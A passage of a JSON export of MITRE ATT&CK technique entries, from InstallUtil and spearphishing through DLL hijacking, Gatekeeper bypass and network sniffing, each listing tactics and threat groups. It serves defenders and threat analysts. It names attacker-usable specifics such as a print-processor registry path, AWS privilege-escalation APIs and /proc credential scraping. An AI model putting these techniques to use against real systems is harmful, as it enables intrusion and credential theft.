on a Windows system: `C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe` and `C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe`.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute `[System.ComponentModel.RunInstaller(true)]`. ^[[2]](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Mustang Panda","menuPass"]},"T1598.003":{"id":"T1598.003","name":"Spearphishing Link","description":"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.^[[1]](https://www.trendmicro.com/en_us/research/20/i/tricky-forms-of-phishing.html)^^[[2]](https://www.pcmag.com/news/hackers-try-to-phish-united-nations-staffers-with-fake-login-pages)^ The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.^[[3]](https://www.mandiant.com/resources/blog/url-obfuscation-schema-abuse)^\n\nAdversaries may also link to \"web bugs\" or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.^[[4]](https://csrc.nist.gov/glossary/term/web_bug)^\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.^[[5]](https://www.zscaler.com/blogs/security-research/fake-sites-stealing-steam-credentials)^^[[6]](https://mrd0x.com/browser-in-the-browser-phishing-attack/)^\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to proxy the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).^[[7]](https://www.proofpoint.com/sites/default/files/threat-reports/pfpt-us-tr-human-factor-report.pdf)^\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Sidewinder","Mustang Panda","Sandworm Team","Silent Librarian","ZIRCONIUM","APT32","Kimsuky","Magic Hound","APT28","Dragonfly","Patchwork"]},"T1021.004":{"id":"T1021.004","name":"SSH","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.","platforms":["Linux","macOS"],"tactics":["Lateral Movement"],"campaigns":[],"groups":["FIN7","Lazarus Group","Leviathan","BlackTech","GCMAN","TEMP.Veles","Fox Kitten","TeamTNT","OilRig","FIN13","menuPass","Rocke","APT39"]},"T1098.003":{"id":"T1098.003","name":"Additional Cloud Roles","description":"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.^[[1]](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html)^^[[2]](https://cloud.google.com/iam/docs/policies)^^[[3]](https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d)^^[[4]](https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide)^ With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).^[[5]](https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/)^\n^[[4]](https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide)^ \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the `CreatePolicyVersion` API to define a new version of an IAM policy or the `AttachUserPolicy` API to attach an IAM policy with additional or distinct permissions to a compromised user account.^[[6]](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)^","platforms":["Office 365","IaaS","SaaS","Google Workspace","Azure AD"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["C0027","SolarWinds Compromise"],"groups":["LAPSUS$","APT29"]},"T1547.012":{"id":"T1547.012","name":"Print Processors","description":"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.^[[1]](https://learn.microsoft.com/windows-hardware/drivers/print/introduction-to-print-processors)^\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the `AddPrintProcessor` API call with an account that has `SeLoadDriverPrivilege` enabled. Alternatively, a print processor can be registered to the print spooler service by adding the `HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver` Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the `GetPrintProcessorDirectory` API call, or referenced via a relative path from this directory.^[[2]](https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor)^ After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.^[[3]](https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/)^\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["Earth Lusca"]},"T1566.001":{"id":"T1566.001","name":"Spearphishing Attachment","description":"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ","platforms":["macOS","Windows","Linux"],"tactics":["Initial Access"],"campaigns":["2015 Ukraine Electric Power Attack","Frankenstein","C0015","Operation Dust Storm","C0011","Operation Spalax","Operation Dream Job"],"groups":["Cobalt Group","Ember Bear","Lazarus Group","Tropic Trooper","FIN6","APT28","admin@338","Windshift","BRONZE BUTLER","WIRTE","MuddyWater","menuPass","Threat Group-3390","Gamaredon Group","APT32","Darkhotel","BITTER","APT29","Inception","EXOTIC LILY","Ajax Security Team","Dragonfly","Sandworm Team","Elderwood","APT33","Molerats","Patchwork","TA551","RTM","APT41","Higaisa","Confucius","TA459","BlackTech","Gorgon Group","Leviathan","Mofang","Naikon","APT12","APT19","APT30","Ferocious Kitten","SideCopy","FIN8","Nomadic Octopus","LazyScripter","Mustang Panda","OilRig","Transparent Tribe","Kimsuky","Machete","FIN4","Wizard Spider","Andariel","TA2541","Tonto Team","Sidewinder","TA505","FIN7","APT37","Silence","IndigoZebra","APT1","APT38","DarkHydrus","The White Company","PLATINUM","Rancor","APT-C-36","APT39","Gallmaker","Frankenstein","Sharpshooter","Dragonfly 2.0","Magic Hound","Turla"]},"T1027.008":{"id":"T1027.008","name":"Stripped Payloads","description":"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.^[[1]](https://www.mandiant.com/resources/blog/golang-internals-symbol-recovery)^^[[2]](https://www.intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/)^\n\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.^[[3]](https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/)^","platforms":["macOS","Linux","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1559.001":{"id":"T1559.001","name":"Component Object Model","description":"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.^[[1]](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)^ Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx)^ Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).^[[1]](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)^\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx)^ Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.^[[1]](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)^^[[3]](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)^","platforms":["Windows"],"tactics":["Execution"],"campaigns":[],"groups":["MuddyWater","Gamaredon Group"]},"T1574.001":{"id":"T1574.001","name":"DLL Search Order Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. ^[[1]](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN)^^[[2]](https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html)^ Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, ^[[3]](https://www.owasp.org/index.php/Binary_planting)^ by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.^[[4]](https://www.fireeye.com/blog/threat-research/2011/06/fxsst.html)^ Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. ^[[5]](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637)^\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.^[[6]](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN)^^[[7]](https://msdn.microsoft.com/en-US/library/aa375365)^^[[8]](https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html)^\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":["RTM","Tonto Team","Whitefly","Aquatic Panda","Evilnum","Threat Group-3390","BackdoorDiplomacy","APT41","menuPass"]},"T1119":{"id":"T1119","name":"Automated Collection","description":"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.","platforms":["Linux","macOS","Windows","IaaS","SaaS"],"tactics":["Collection"],"campaigns":["Operation Wocao","Frankenstein"],"groups":["Gamaredon Group","APT1","Ke3chang","FIN5","APT28","Confucius","OilRig","FIN6","Patchwork","Tropic Trooper","Sidewinder","Chimera","Threat Group-3390","Mustang Panda","menuPass","Frankenstein","Operation Wocao"]},"T1115":{"id":"T1115","name":"Clipboard Data","description":"Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using `clip.exe` or `Get-Clipboard`.^[[1]](https://msdn.microsoft.com/en-us/library/ms649012)^^[[2]](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip)^^[[3]](https://www.cisa.gov/uscert/ncas/alerts/aa21-200b)^ Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).^[[4]](https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems)^\n\nmacOS and Linux also have commands, such as `pbpaste`, to grab clipboard contents.^[[5]](https://medium.com/rvrsh3ll/operating-with-empyre-ea764eda3363)^","platforms":["Linux","Windows","macOS"],"tactics":["Collection"],"campaigns":["Operation Wocao"],"groups":["APT39","APT38","Operation Wocao"]},"T1003.007":{"id":"T1003.007","name":"Proc Filesystem","description":"Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.^[[1]](https://www.picussecurity.com/resource/the-mitre-attck-t1003-os-credential-dumping-technique-and-its-adversary-use)^^[[2]](https://www.baeldung.com/linux/proc-id-maps)^\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.^[[3]](https://github.com/huntergregal/mimipenguin)^^[[4]](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#proc-usdpid-maps-and-proc-usdpid-mem)^\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.","platforms":["Linux"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1583.005":{"id":"T1583.005","name":"Botnet","description":"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.^[[1]](https://us.norton.com/internetsecurity-malware-what-is-a-botnet.html)^ Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).^[[2]](https://www.imperva.com/learn/ddos/booters-stressers-ddosers/)^^[[3]](https://krebsonsecurity.com/2017/01/who-is-anna-senpai-the-mirai-worm-author/)^^[[4]](https://krebsonsecurity.com/2016/10/hackforums-shutters-booter-service-bazaar/)^^[[5]](https://krebsonsecurity.com/2016/10/are-the-days-of-booter-services-numbered/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1555.005":{"id":"T1555.005","name":"Password Managers","description":"Adversaries may acquire user credentials from third-party password managers.^[[1]](https://www.ise.io/casestudies/password-manager-hacking/)^ Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.^[[1]](https://www.ise.io/casestudies/password-manager-hacking/)^\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.^[[2]](https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf)^^[[3]](https://github.com/GhostPack/KeeThief)^ Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).^[[4]](https://nvd.nist.gov/vuln/detail/CVE-2019-3610)^\n Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.^[[5]](https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware)^","platforms":["Linux","macOS","Windows"],"tactics":["Credential Access"],"campaigns":["Operation Wocao"],"groups":["Threat Group-3390","Fox Kitten","LAPSUS$","Operation Wocao"]},"T1553.001":{"id":"T1553.001","name":"Gatekeeper Bypass","description":"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.^[[1]](https://eclecticlight.co/2020/10/29/quarantine-and-the-quarantine-flag/)^(Citation: TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.^[[2]](https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update)^^[[3]](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)^\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.^[[4]](https://theevilbit.github.io/posts/gatekeeper_not_a_bypass/)^^[[5]](https://redcanary.com/blog/mac-application-bundles/)^\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).","platforms":["macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1608.004":{"id":"T1608.004","name":"Drive-by Target","description":"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).\n\nAdversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.^[[1]](https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html)^^[[2]](http://arstechnica.com/security/2015/08/newly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes/)^ This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.^[[3]](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)^\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["C0010"],"groups":["Transparent Tribe","LuminousMoth","Dragonfly","APT32","FIN7","Threat Group-3390"]},"T1007":{"id":"T1007","name":"System Service Discovery","description":"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as `sc query`, `tasklist /svc`, `systemctl --type=service`, and `net start`.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","platforms":["Windows","macOS","Linux"],"tactics":["Discovery"],"campaigns":["Operation Wocao","Operation CuckooBees"],"groups":["BRONZE BUTLER","TeamTNT","Indrik Spider","OilRig","Turla","Aquatic Panda","Poseidon Group","Kimsuky","Chimera","Ke3chang","Earth Lusca","admin@338","APT1","Operation Wocao"]},"T1040":{"id":"T1040","name":"Network Sniffing","description":"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.^[[1]](https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html)^^[[2]](https://cloud.google.com/vpc/docs/packet-mirroring)^^[[3]](https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview)^ Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.^[[4]](https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/)^^[[5]](https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512)^ The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.^[[4]](https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/)^\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.^[[6]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^^[[7]](https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-embedded-packet-capture/116045-productconfig-epc-00.html)^","platforms":["Linux","macOS","Windows","Network","IaaS"],"tactics":["Credential Access","Discovery"],"campaigns":["2015 Ukraine Electric Power Attack"],"groups":["Sandworm Team","Kimsuky","APT33","DarkVishnya","APT28","Stolen Pencil"]},"T1553.002":{"id":"T1553.002","name":"Code Signing","description":"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. ^[[1]](https://en.wikipedia.org/wiki/Code_signing)^ The certificates used during an operation may be created, acquired, or stolen by the adversary. ^[[2]](https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/)^ ^[[3]](http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates)^ Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. ^[[1]](https://en.wikipedia.org/wiki/Code_signing)^^[[4]](https://eclecticlight.co/2020/11/16/checks-on-executable-code-in-catalina-and-big-sur-a-first-draft/)^\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. ","platforms":["macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["C0015","Operation Honeybee","Operation Dream Job","SolarWinds Compromise"],"groups":["FIN7","Scattered Spider","Patchwork","Kimsuky","GALLIUM","APT41","Molerats","Ember Bear","Lazarus Group","Moses Staff","Silence","Wizard Spider","Leviathan","FIN6","menuPass","PROMETHIUM","Darkhotel","TA505","Suckfly","LuminousMoth","Winnti Group","CopyKittens","UNC2452","APT29","Honeybee"]},"T1530":{"id":"T1530","name":"Data from Cloud Storage","description":"Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.^[[1]](https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/)^^[[2]](https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide)^^[[3]](https://cloud.google.com/storage/docs/best-practices)^ There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.^[[4]](https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/a-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia)^^[[5]](https://www.wired.com/story/magecart-amazon-cloud-hacks/)^^[[6]](https://www.hipaajournal.com/47gb-medical-records-unsecured-amazon-s3-bucket/)^^[[7]](https://redcanary.com/blog/rclone-mega-extortion/)^\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.","platforms":["IaaS","SaaS","Google Workspace","Office 